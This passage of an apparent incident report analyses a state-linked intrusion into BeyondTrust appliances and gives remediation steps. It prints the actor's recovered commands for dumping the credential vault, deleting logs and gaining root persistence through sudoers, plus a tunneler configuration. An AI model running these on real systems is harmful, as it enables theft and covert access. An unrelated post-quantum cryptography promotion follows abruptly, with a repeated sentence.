SAWFLY webshell and the BARECLAW tunneler to interact with the BeyondTrust device. Additionally, the actor routinely deleted appliance logs and endpoint artifacts to maintain access and evade detection. Figure 1: ARMORY CASTLE BeyondTrust compromise sequence of events Staging Webshell After successful exploitation of CVE-2026-102764, ARMORY CASTLE initiated POST requests to /app_84304470%2Ephp . Mandiant was unable to recover the file associated with the POST requests. Approximately 11 minutes following the initial POST request, the file system recorded the creation of the SAWFLY webshell at the web root path /%SITE_SERVICE_ACCOUNT%/ingredi/app/laravel/public/ . ARMORY CASTLE leveraged the SAWFLY webshell as one of their primary footholds within the environment over the course of the intrusion. SAWFLY Webshell SAWFLY ( mangoapi.php ) is an obfuscated, lightweight PHP webshell that implements bidirectional encrypted C2 communication using a custom Base32 transport layer and a 256-bit RC4 stream cipher. The webshell inspects incoming HTTP POST requests for the obfuscated parameter _c94mfe . If the parameter is absent, the script immediately sets HTTP status 404 Not Found ( http_response_code(404) ) and exits to evade automated web crawlers and vulnerability scanners. When the _c94mfe parameter is supplied, the webshell Base32-decodes the payload, decrypts it using RC4 with a hardcoded 32-byte key and executes the resulting PHP code via @eval() . Any non-null return value from the evaluated code is RC4-encrypted with the same key, Base32-encoded, and echoed back to the client. Privilege Escalation via SUID Bit Permissions The SAWFLY webshell ran under the site's service account, an unprivileged local user. To escalate privileges, the threat actor copied the system shell executable ( /bin/sh ) to the file /usr/bin/dbus-authd . The threat actor then modified the file's ownership to root and enabled Set User ID (SUID) permissions. When a binary has SUID permissions enabled, it executes with the privileges of the file's owner (root) rather than the user running the command, effectively granting the threat actor a persistent root-level backdoor on the host system. After establishing a foothold through the web shell, the actor elevated from the web service account to root-level control of the appliance host. This gave them access to every credential the appliance stored or brokered and the ability to modify files that survive reboot and configuration reset. Credential Harvesting: BeyondTrust Vault Extraction Mandiant observed the threat actor attempt to harvest credentials directly from the appliance's native secrets management database. To achieve this, the actor leveraged the /ns/sbin/bt-secrets binary which is a proprietary, administrative Command Line Interface (CLI) utility native to BeyondTrust appliances used to manage, store, and retrieve passwords, API keys, and endpoint credentials. The threat actor systematically iterated through several CLI syntax variations to locate and dump the appliance's credential vault: /ns/sbin/bt-secrets get -p %SITE_SERVICE_ACCOUNT% vault /ns/sbin/bt-secrets get %SITE_SERVICE_ACCOUNT% vault /ns/sbin/bt-secrets get vault Figure 2: Recovered Commands from message logs First, the threat actor attempted to target the vault for a specific site service account in order to pull passwords and keys assigned exclusively to that profile. Next, they issued a fallback command, targeting the global, appliance-level password safe to dump all stored administrative credentials. The threat actor concluded their interaction with the bt-secrets binary by forcibly removing the records stored i n /home/bomgar/log/bt-secrets.log and any archived files. /usr/sbin/sh -c 'rm -f /home/bomgar/log/bt-secrets.log /home/bomgar/log/bt-secrets.log.* 2>/dev/null;' Figure 3: Recovered Commands from message logs Persistence For long-term persistent access, Mandiant observed the threat actor target the BeyondTrust configuration templates to grant passwordless root privileges to the site service account. First, the threat actor created the /home/bomgar/sbin/post_boot.d directory, which is reserved for scripts executed automatically at system startup. Within this directory, they created a shell script named zz-root-persist . The contents of the zz-root-persist script indicate that it first checks if the user account is already granted passwordless root privileges within the /ns/config/sudoers.template file. If the entry is missing, the script appends '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' to the template. This entry added to the sudoers template grants the site user account passwordless administrative privileges to execute any command on the host system. Finally, the script executes '/ns/sbin/bt-sysconfig' --no-restart misc , which forces the appliance backend to immediately parse /ns/config/sudoers.template and rebuild the active /etc/sudoers file. This strategy ensures the threat actor's privilege escalation survives system reboots and configuration resets, which would normally overwrite manual changes made directly to /etc/sudoers . #!/bin/bash grep -qF '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' '/ns/config/sudoers.template' || echo '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' >> '/ns/config/sudoers.template' '/ns/sbin/bt-sysconfig' --no-restart misc Figure 4: Contents of zz-root-persist Anti-Forensics Throughout their unauthorized access to the appliance, Mandiant observed multiple instances where the threat actor attempted to impair defenses and hinder detection by systematically deleting system, web server, and application-level logs. Originating from the SAWFLY webshell, the threat actor executed the following command using elevated sudo privileges to delete active logs across both host and site-specific directories: 'rm -f \'/ns/log/auth.log\' \'/ns/log/ssl.log\' \'/ns/log/proto-handler.log\' \'/ns/log/bt-docker.log\' \'/ns/log/http-access.log\' \'/ns/log/http-errors.log\' \'/ns/log/php-fpm.log\' \'/ns/log/php-fpm-access.log\' \'/ns/log/php_debug.log\' \'/ns/log/php_web_errors.log\' \'/var/log/messages\' \'/home/%SITE_SERVICE_ACCOUNT%/ingredi/log/httpd_access.log\' \'/home/%SITE_SERVICE_ACCOUNT%/ingredi/log/httpd_error.log\' /tmp/sshauth.*' Figure 5: Recovered Command Lateral Movement: BeyondTrust Admin Session Abuse After the compromise of the BeyondTrust device, the threat actor pivoted into the BeyondTrust Remote Support application to perform reconnaissance via compromised Administrator credentials. First, the threat actor leveraged the Administrator account to log into the web administrative portal. { "event": "login", "status": "success", "target": "web/login", "who": "[REDACTED_USERNAME] using password", "who_ip": "[REDACTED_IP]" } Figure 6: BeyondTrust Syslog Entry After testing their initial access and verifying their ability to temporarily join the native Administrators group policy, the threat actor altered their strategy for long-term persistence. The actor directly modified the compromised account's permissions, upgrading both local Jump Items and Team permissions from No Access to Administrator . Jump Items are individual systems or devices that are made available for remote access within a Jump Group, enabling administrators to organize and control access to remote systems. This configuration change granted the threat actor permanent, unrestricted authorization to launch remote sessions to downstream systems populated within the appliance's Jump Item list. { "event": "user_changed", "old_username": "[REDACTED]", "old_permissions:jump_item_role:default:id": 1, "new_permissions:jump_item_role:default:id": 3, "old_permissions:jump_item_role:default:name": "No Access", "new_permissions:jump_item_role:default:name": "Administrator", "old_permissions:jump_item_role:teams:id": 1, "new_permissions:jump_item_role:teams:id": 3, "old_permissions:jump_item_role:teams:name": "No Access", "new_permissions:jump_item_role:teams:name": "Administrator" } Figure 7: BeyondTrust Syslog Entry Internal Reconnaissance Once the threat actor obtained elevated administrative privileges, Mandiant observed the threat actor establish a remote support session to target internal endpoints. Once connected, the threat actor leveraged the appliance’s built-in support tools to request and obtain full file-system access. The threat actor utilized the native BeyondTrust Remote Support file transfer service to download and exfiltrate sensitive internal documents useful for network reconnaissance, such as software inventories, directly from the user's desktop environment. BARECLAW Tunneler Mandiant observed the threat actor tunnel traffic through the BeyondTrust device via a custom SOCKS5 proxy tunneler. BARECLAW is a tunneler written in C that provides a SOCKS5 proxy service carried over the WebSocket transport and relays TCP connections between a remote client and destinations. BARECLAW statically embeds a CivetWeb WebServer to supply its HTTP and WebSocket functionality and utilizes OpenSSL for TLS. BARECLAW is configurable and provides the option to require authentication, to encrypt data between the client and tunneler, to restrict reachable destinations to specific CIDR ranges, to chain traffic to an upstream proxy, and to modify its default WebSocket endpoint and listening ports. TLS is enabled by providing a PEM certificate while authentication, encryption, destination filtering, and TLS are disabled by default. BARECLAW receives its configuration through CLI input and it provides a CLI option menu: Usage: %s [options] --listen PORT plain ws port (default 8080) --listen-tls PORT wss port (default 8443, needs --ssl-cert) --ssl-cert FILE PEM certificate (enables wss) --token STRING shared secret (?token= auth + obfs seed) --obfs enable XOR stream obfuscation --timeout SEC idle timeout (default 300) --connect-timeout SEC target connect timeout (default 10) --max-tunnels N concurrent tunnel limit (default 100) --allow-net CIDR allowed target subnet (repeatable) --upstream [socks5://]host:port route via upstream SOCKS5 --threads N civetweb worker threads (default 64) --ws-path PATH websocket endpoint path (default /wsproxy) -q, --quiet zero output (all logging suppressed) -h this help Figure 8: BARECLAW CLI Option Menu The threat actor executed BARECLAW through the following command line arguments: /tmp/ingredi_ws --listen 19800 --token %REDACTED% --obfs -q --ws-path /uidchanarge Figure 9: BARECLAW full Command-Line Arguments This command line configures BARECLAW to listen on TCP port 19800 and create the WebSocket endpoint /uidchanarge on the victim system. Clients are required to authenticate using the token specified in the command line arguments while the -q argument suppresses the tunneler’s logging. Tunneled data is encrypted with an XOR-based routine derived from that token and an 8-byte value provided by the client at the start of the session. The lack of the --ssl-cert and --listen-tls arguments in the CLI options means TLS was not enabled in this specific instance. Modifications to Haproxy.conf In addition to the creation of the BARECLAW tunneler, Mandiant observed the threat actor modify the /ns/config/haproxy.conf file in order for BARECLAW to be accessible directly from the internet. The HAProxy service running on BeyondTrust devices acts a reverse proxy for the device that accepts incoming requests on behalf of the BeyondTrust server and forwards the request to the appropriate backend services running on the local system (such as web interfaces, administration portals, or application gateways) based on the request's port or URL path. The haproxy.conf file is the primary configuration script that dictates how the BeyondTrust appliance handles, routes, and secures incoming traffic. The threat actor modifications first established an Access Control List (ACL) named wswsws to monitor incoming traffic for the specific URI path /uidchanarge . When a request matching this path is detected, HAProxy bypasses normal appliance web services and routes the traffic to a custom backend designated as webskd3 . acl wswsws path /uidchanarge use_backend webskd3 if wswsws Figure 10: ACL Modification to haproxy.conf Next, the webskd3 backend routes the incoming web stream locally (127.0.0.1 / localhost) to TCP port 19800, where the BARECLAW utility is actively listening. This local-only binding ensures that the backdoor listener remains completely hidden from external network scans, as it can only be reached internally via HAProxy's local redirection. backend webskd3 mode http server websocks5srv 127.0.0.1:19800 option http-keep-alive timeout server 28s timeout tunnel 5h Figure 11: Backend Route Modification to haproxy.conf Attribution GTIG attributes the zero-day exploitation of CVE-2026-102764 and the subsequent deployment of SAWFLY and BARECLAW to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). The tooling and TTPs leveraged within this intrusion align with previously observed activity from ARMORY CASTLE. GTIG has previously reported ARMORY CASTLE exploiting multiple vulnerabilities in edge appliances and deploying an extensive suite of custom tooling to support their objectives, ranging from passive backdoors and webshells to trojanized components of edge devices. ARMORY CASTLE has been active as early as October 2023 and has targeted a wide range of countries and verticals during their operations. Outlook and Implications In past campaigns, ARMORY CASTLE has conducted widespread and opportunistic exploitation following the public disclosure of vulnerabilities it had exploited selectively as zero-days, racing to infiltrate target organizations before patches are deployed. It is possible that we will observe similar widespread exploitation attempts associated with CVE-2026-102764. GTIG assesses with high confidence that ARMORY CASTLE will continue to leverage zero-day vulnerabilities in edge devices to gain access to environments to support their espionage objective. Defenders should also prepare for the possibility that following disclosure of CVE-2026-102764, ARMORY CASTLE may conduct widespread exploitation similar to what GTIG observed in 2024 following the disclosure of CVE-2023-46805 and CVE-2024-21887. Remediation and Hardening Organizations that have not yet applied the BT26-05 patch should immediately assess their exposure and risk, and review additional guidance from BeyondTrust in their blog . CVE-2026-102764 affects all supported Remote Support versions up to 26.2.3 and allows an unauthenticated remote attacker to perform file operations on the appliance, which can lead to host-level control and access to every credential the appliance stores or brokers. Any appliance that was reachable from the internet on a vulnerable version during the exploitation window should be treated as potentially compromised until it has been reviewed. Mandiant recommends a phased, patch-first approach that balances containment against disruption to support operations. Immediate Mitigation Organizations should choose among the following options based on their risk tolerance, evidence of compromise, and operational needs. Option 1: Apply the BT26-05 Patch (Mandiant Recommended) Remote Support SaaS : BeyondTrust applied the patch to all SaaS tenants on October 9, 2026. No customer action is required for the appliance itself. The credential and configuration steps in Option 3 still apply. Self-hosted, version 24.3.1 or later : Apply the BT26-05-RS patch from the /appliance interface, or confirm it was applied automatically if the appliance is subscribed to automatic updates. Self-hosted, older than 24.3.1 : Upgrade to a supported version, then apply the patch. Upgrading closes the vulnerability but does not remediate prior exposure. If the patch is not visible in /appliance , open a case with BeyondTrust Support referencing BT26-05. Option 2: Isolate Compromised or Suspected Appliances Preserve before acting : Snapshot virtual appliances with memory and export the disk before any change or reboot. For B Series hardware and SaaS tenants, request forensic preservation through BeyondTrust Support. Collect syslog, reverse-proxy or WAF, and perimeter firewall logs for the full exposure window, since an attacker with host access can delete on-appliance logs. Mandiant determined that the actor removed logs throughout the incident. Isolate at the perimeter : Block inbound traffic to the appliance's public address at the firewall rather than in /appliance , so the configuration remains intact for review. Restrict egress : Deny outbound traffic except to BeyondTrust update and licensing endpoints, and log every denied connection. Terminate access paths : End active support sessions and disable new sessions, Jump Clients, Jumpoints, and API accounts from /login . Disable rather than delete so the audit trail survives. Rebuild rather than clean : Redeploy appliances with confirmed or unknown compromise status from a clean, fully patched image. Customers cannot audit the appliance host file system, and host-level persistence survives reboot and configuration reset. Restore only a configuration backup dated before the exposure window, or restore the newest backup while isolated and complete the review in Option 3, Part B, before reconnecting anything. Issue a new TLS certificate and redeploy Jump Clients, Jumpoints, and the representative console from the rebuilt appliance. Note : Isolation and session termination interrupt support operations. Organizations should coordinate with help desk and vendor-support stakeholders before proceeding. Option 3: Apply Targeted Compensating Controls The following controls reduce exposure and limit post-exploitation impact. They do not substitute for the patch. Part A: Network Restrictions Restrict access to the /login and /appliance administrative interfaces by IP or network segment at the appliance level. Only representative console, customer portal, and Jump Client traffic should be reachable from the internet. Where operationally possible, place a reverse proxy or WAF with full URI logging in front of the appliance to keep a record of request paths that the appliance cannot alter. Part B: Credential Rotation and Configuration Review Revoke sessions and enrollments : End all active support sessions, then redeploy Jump Clients, Jumpoints, and the representative console from the patched or rebuilt appliance to invalidate existing tokens. Rotate credentials in dependency order : /appliance administrative credentials; /login administrators and local users; API client secrets; security provider bind accounts and SAML signing keys; Remote Support Vault and integrated Password Safe or Privileged Remote Access (PRA) credentials, rotated at the target system; integration credentials (SMTP, syslog, Information Technology Service Management (ITSM) connectors, outbound event secrets); and any credential typed into a support session during the window. Review the /login configuration against a pre-window baseline : user and role changes, particularly Jump Item roles raised to Administrator; group and session policies; API accounts; security providers; Jump Items and Jumpoints; and outbound event or syslog destinations. Remove anything without a change record or a named owner. Review support session reports for the window, including file transfers, to establish which endpoints were accessed and what left them. Every endpoint touched is in scope for downstream hunting. Note : Rotate credentials only after the appliance has been patched or rebuilt. Rotating earlier exposes the new credentials to an attacker who still controls the appliance. Part C: Control Plane Restrictions Require SAML single sign-on with phishing-resistant MFA for all /login users, and remove local accounts except one vaulted break-glass account with alerting on use. Ensure the built-in Admin account is configured with Multi-Factor Authentication (MFA) in accordance with the official BeyondTrust Two-Factor Authentication Guidelines . Set the default Jump Item role in every group policy to No Access, and grant roles through policy rather than per user. Scope API accounts to the minimum permission set, with a named automation owner for any account holding user or Jump Item management rights, and rotate API secrets on a schedule. Keep privileged credentials in Password Safe or an external vault with credential injection rather than in the Remote Support Vault, and store only non-interactive service account credentials on the appliance. Apply default-deny outbound filtering from the appliance, allowing only BeyondTrust endpoints and the organization's own syslog and directory servers. Part D: Logging and Detection Engineering Logging and Visibility Forward appliance syslog to a SIEM over TLS with retention that covers a multi-month exposure window, and collect reverse-proxy or WAF and perimeter firewall logs for the appliance's address. Export /login session, team activity, and user audit reports on a schedule. Detection Engineering Account and policy changes : user_changed events that raise a Jump Item or team role; user_added , api_account , and security_provider events with no change ticket; any change to outbound events or syslog destinations. Authentication : /login success from residential-broadband or commercial-VPN address space, and administrative logins outside business hours. Session activity : file-transfer events, and sessions started by accounts whose roles changed during the window. Request paths : at the reverse proxy or WAF, paths outside the known Remote Support path set, including unknown .php paths and WebSocket upgrades from outside support staff and endpoint address ranges. Anti-forensics: gaps in syslog forwarding from the appliance; an interruption bounded by a single session is a strong indicator of log tampering. Indicators of Compromise (IOCs) To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a GTI Collection for registered users. For security leaders and policymakers, the research is dense, scattered across papers and engineering blogs, and can be challenging to turn into action. To help, we're launching Prepare for Post-Quantum Cryptography , a public Gemini Notebook that brings Google's PQC research, engineering blogs, and migration guidance together in one place. Ask it questions, listen to an audio overview, or test yourself with flashcards, and quickly get up to speed on the quantum threat. Why PQC matters now Quantum computing is rapidly moving from theory to reality. Our Willow chip and Quantum Echoes algorithm mark substantial progress, and Google research estimates that breaking ECDLP-256 and RSA-2048 encryption — the public-key cryptography schemes protecting much of our online data — would require around 500,000 and 1 million imperfect quantum computer components (noisy qubits), respectively. To help, we're launching Prepare for Post-Quantum Cryptography, a public Gemini Notebook that brings Google's PQC research, engineering blogs, and migration guidance together in one place. This research has consequences now. It indicates that today’s online security is more vulnerable to future quantum computers than previously thought. In Store Now, Decrypt Later attacks, adversaries may steal encrypted data now and wait to decrypt it once a sufficiently powerful quantum computer exists. Data that we’ve long considered sensitive — health records, financial data, intellectual property, and government secrets — is already at risk . With continued advances in architecture, quantum algorithms, and quantum error correction shrinking future quantum hardware requirements, waiting to upgrade our digital locks is not a viable option. To help organizations stay ahead of the curve, Google has published a migration timeline noting our plans to transition to PQC by 2029, and we urge others to consider the same. As the technology advances, policymakers should consider urging critical infrastructure owners and operators to recognize condensed timelines, and build PQC readiness into existing risk mitigation plans. We also recommend governments engage with global counterparts to promote a harmonized approach to standards development, and include technical and security experts in the building of policy and regulatory requirements focused on quantum safety. Google's PQC expertise, in one notebook The Prepare for Post-Quantum Cryptography notebook turns years of Google expertise into an interactive primer that anyone can use. It's built on curated Google sources covering the quantum era, quantum computing breakthroughs like Willow, Quantum Echoes, and surface code error suppression, industry PQC standards, Google's own deployments, and the latest research. In the Gemini Notebook, you can: Get answers grounded in Google's sources. Listen to a podcast-style audio overview. Test your PQC knowledge with flashcards. Explore an interactive visual diagram of the quantum threat. Read a concise briefing document. Try these prompts To get started, here are a few questions to ask the notebook: For CISOs : "What should a CISO prioritize in the first 90 days of a PQC migration?" For anyone new to PQC : "Explain store-now-decrypt-later in plain terms." For developers : "How does hybrid ML-KEM key exchange work in Chrome?" As with all generative AI, the notebook can make mistakes, so check its responses against the linked sources. What's at stake Previous cryptographic migrations, such as moving from SHA-1 or upgrading TLS, have taken a decade or more. Waiting for the availability of a cryptographically-relevant quantum computer before beginning the migration journey represents a significant security risk given the importance of public-key cryptography for securing digital essentials like web traffic, software updates, digital identities, and signatures. For CISOs, we recommend that you start by: Understanding where vulnerable cryptography lives in your organization. Identifying and prioritizing data and systems most at risk from quantum threats, and developing a plan for addressing these risks. Anticipate system-wide effects that PQC migration could have. Building crypto-agility into your security plans, using learnings from past experiences like Heartbleed. Additional detail on these recommendations is available in our previous blog post . For the broader security community, the transition only succeeds if this knowledge is accessible to everyone — not just organizations with dedicated cryptography teams. How Google is putting PQC into practice We’ve been deploying PQC for years. Highlights include: Hybrid Kyber/ML-KEM key exchange protecting Chrome traffic PQC in Android Quantum-safe digital signatures in Cloud KMS PQC for Google's internal communications Wiz PQC readiness scanner across code, cloud, and runtime We also co-founded the Post-Quantum Cryptography Alliance at the Linux Foundation with industry leaders including Amazon Web Services, Cisco, IBM, and NVIDIA to support open-source tools like Open Quantum Safe . Build a PQC notebook for your own team Here’s how you can create a resource similar to our PQC Gemini Notebook, specific to your organization’s needs: Curate trusted sources . Start with a focused set of authoritative research, standards, and guidance. Write neutral prompts . Keep instructions factual so outputs stay grounded in your sources. Add AI disclaimers and a welcome note . Tell readers what the notebook covers and remind them that AI can make mistakes. Review all output with human oversight . Have experts check every artifact before you share it. Start preparing today The quantum transition has already started, but preparing your organization doesn't have to begin with a 100-page whitepaper. Start by understanding the threat, then assess your cryptographic inventory and build a migration roadmap. You can get started with the Prepare for Post-Quantum Cryptography Gemini Notebook and share it with your team today.
